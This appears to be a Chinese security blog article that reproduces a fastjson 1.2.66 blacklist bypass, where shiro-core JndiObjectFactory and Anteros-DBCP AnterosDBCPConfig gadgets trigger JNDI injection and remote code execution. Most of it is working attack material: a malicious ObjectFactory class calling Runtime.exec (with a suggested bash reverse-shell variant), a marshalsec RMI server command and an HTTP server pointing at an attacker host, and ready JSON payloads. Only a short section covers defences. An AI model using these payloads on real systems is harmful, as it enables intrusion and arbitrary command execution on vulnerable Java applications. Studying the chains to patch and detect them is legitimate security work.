---
title: Fastjson 1.2.66 黑名单绕过利用链：Shiro-core 与 Anteros-DBCP 触发 JNDI 注入 RCE 完整复现
description: 深度分析 fastjson 1.2.66 版本在开启 autotype 的前提下，通过 shiro-core 中的 JndiObjectFactory
  与 Anteros-DBCP 中的 AnterosDBCPConfig 两条新利用链绕过黑名单，触发 JNDI 注入实现远程代码执行的完整复现过程，包含 Maven
  依赖配置、恶意类编写、marshalsec 监听部署及 POC 构造细节。
category: program-analysis
tags:
- fastjson
- 反序列化
- JNDI注入
- RCE
- shiro-core
- Anteros-DBCP
- 黑名单绕过
- marshalsec
- 漏洞复现
date: '2023-04-13'
updated: '2026-11-15'
---

## 概述

fastjson 1.2.66 版本虽然引入了黑名单机制限制危险类的反序列化，但在开启 `autotype`（`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`）的前提下，仍可通过引入特定第三方依赖包中的特定类绕过黑名单，触发 JNDI 注入实现远程代码执行。本文详细复现两条经实战验证的利用链：

1. **shiro-core** 中的 `org.apache.shiro.jndi.JndiObjectFactory`
2. **Anteros-DBCP** 中的 `com.anteros.dbcp.AnterosDBCPConfig`

两条链均利用 `lookup` 方法触发 JNDI 查找，配合 marshalsec 恶意服务端实现任意命令执行。

## 环境准备

### Maven 依赖配置

在项目 `pom.xml` 中引入 fastjson 1.2.66 及两个目标依赖：

```xml
<!-- fastjson 1.2.66（含黑名单机制） -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.66</version>
</dependency>

<!-- shiro-core 1.5.1：含 JndiObjectFactory -->
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.1</version>
</dependency>

<!-- Anteros-DBCP：含 AnterosDBCPConfig -->
<dependency>
    <groupId>com.anteros</groupId>
    <artifactId>anteros-dbcp</artifactId>
    <version>2.1.3</version>
</dependency>
```

> **注意**：必须显式开启 `autotype`，否则 fastjson 默认拒绝反序列化指定 `@type` 的类。

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

## 利用链一：shiro-core JndiObjectFactory

### 核心类分析

在 `shiro-core-1.5.1.jar` 中搜索 `lookup` 关键字，定位到 `org.apache.shiro.jndi.JndiObjectFactory`：

```java
public class JndiObjectFactory implements ObjectFactory {
    private String resourceName;
    private String resourceRef;

    public void setResourceName(String resourceName) { this.resourceName = resourceName; }
    public void setResourceRef(String resourceRef) { this.resourceRef = resourceRef; }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        // 内部会调用 InitialContext.lookup(resourceName) 触发 JNDI 查找
        return lookup(resourceName, resourceRef);
    }
}
```

该类实现了 `javax.naming.spi.ObjectFactory` 接口，`getObjectInstance` 方法在 JNDI 注入场景下会被自动调用，并执行 `lookup`。

### 恶意类编写与编译

编写实现 `ObjectFactory` 接口的恶意类，在 `getObjectInstance` 中执行命令：

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            // macOS 弹计算器示例；Linux 可改为 "bash -c {echo,base64_payload}|{base64,-d}|{bash,-i}"
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

编译生成 `Exploit.class`：

```bash
javac Exploit.java
```

### marshalsec 监听部署

使用 marshalsec 启动 RMI/LDAP 恶意服务端，指定恶意类路径：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://<attacker_ip>:8090/#Exploit" 1099
```

将编译好的 `Exploit.class` 放置在攻击机 Web 目录（如 Python 简单 HTTP 服务）的 8090 端口下：

```bash
python3 -m http.server 8090
```

### POC 构造与触发

fastjson 反序列化 payload，指定 `@type` 为 `org.apache.shiro.jndi.JndiObjectFactory`，并设置 `resourceName` 指向恶意 RMI 地址：

```json
{
    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
    "resourceName": "rmi://<attacker_ip>:1099/Exploit"
}
```

Java 触发代码：

```java
String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://<attacker_ip>:1099/Exploit\"}";
JSON.parse(payload);  // 触发反序列化与 JNDI 注入
```

成功执行后，目标机器将弹出计算器（或执行指定命令）。

## 利用链二：Anteros-DBCP AnterosDBCPConfig

### 核心类分析

在 `anteros-dbcp` 包中搜索 `lookup`，定位到 `com.anteros.dbcp.AnterosDBCPConfig`，其 `setMetricRegistry` 方法调用链最终触发 `getObjectOrPerformJndiLookup`：

```java
public class AnterosDBCPConfig {
    private String metricRegistry;

    public void setMetricRegistry(String metricRegistry) {
        this.metricRegistry = metricRegistry;
        // 内部调用 getObjectOrPerformJndiLookup(metricRegistry)
        getObjectOrPerformJndiLookup(metricRegistry);
    }

    private Object getObjectOrPerformJndiLookup(String jndiName) {
        // 执行 InitialContext.lookup(jndiName)
        return new InitialContext().lookup(jndiName);
    }
}
```

### POC 构造与触发

fastjson 反序列化 payload，指定 `@type` 为 `com.anteros.dbcp.AnterosDBCPConfig`，并设置 `metricRegistry` 指向恶意 RMI/LDAP 地址：

```json
{
    "@type": "com.anteros.dbcp.AnterosDBCPConfig",
    "metricRegistry": "rmi://<attacker_ip>:1099/Exploit"
}
```

Java 触发代码：

```java
String payload = "{\"@type\":\"com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://<attacker_ip>:1099/Exploit\"}";
JSON.parse(payload);  // 触发反序列化与 JNDI 注入
```

同样可实现任意命令执行。

## 检测与防御建议

1. **升级 fastjson**：升级至 1.2.68+ 版本，黑名单机制持续更新，且默认关闭 `autotype`。
2. **禁用 autotype**：生产环境严禁开启 `ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`。
3. **JNDI 注入防护**：
   - JDK 8u191+ / 11.0.1+ / 12.0.1+ 默认限制 `com.sun.jndi.rmi.object.trustURLCodebase` 与 `com.sun.jndi.ldap.object.trustURLCodebase` 为 `false`，阻断远程类加载。
   - 可通过 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=false` 显式加固。
4. **依赖排查**：排查项目传递依赖中是否引入 `shiro-core`、`anteros-dbcp` 等含 JNDI lookup 类的库，若非必要请移除或升级至安全版本。
5. **流量监控**：部署 WAF/RASP 监控 fastjson 反序列化特征 payload（`@type` 指定危险类、包含 `rmi://` `ldap://` 等协议头）。

## 交叉引用

- [[log4j2-rce-reproduction]] — Log4j2 Log4Shell (CVE-2021-44228) JNDI 注入 RCE 完整复现，对比 fastjson 与 Log4j2 反序列化利用链异同
- [[shiro-internal-penetration-case-study]] — Shiro RCE 初始访问结合内网渗透实战案例，涵盖免杀上线 Cobalt Strike、NTLM 凭证导出、FTP 横向移动
- [[cve-2023-25194-kafka-connect-jndi-rce]] — Apache Kafka Connect 基于 SASL JAAS 配置的 JNDI 注入 RCE 分析
- [[python-pickle-deserialization-rce]] — Python pickle `__reduce__` 反序列化 RCE 原理与利用链构造
- [[dotnet-xmlserializer-expandedwrapper-deserialization-gadget]] — .NET XmlSerializer ExpandedWrapper Gadget 链反序列化 RCE 分析
- [[xxe-xml-dtd-fundamentals]] — XXE 外部实体注入与 JNDI 注入在带外数据外带层面的相似性对比

## 参考资源

- marshalsec 项目：https://github.com/mbechler/marshalsec
- JNDI-Exploit-Bypass-Demo：https://github.com/welk1n/JNDI-Injection-Exploit
- fastjson 安全更新公告：https://github.com/alibaba/fastjson/wiki/security_update_20220523
- JDK JNDI 防护机制说明：https://www.oracle.com/java/technologies/javase/8u191-relnotes.html

## 来源

- [226安全团队-201805-202103_09](../sources/226安全团队-201805-202103_09.md)
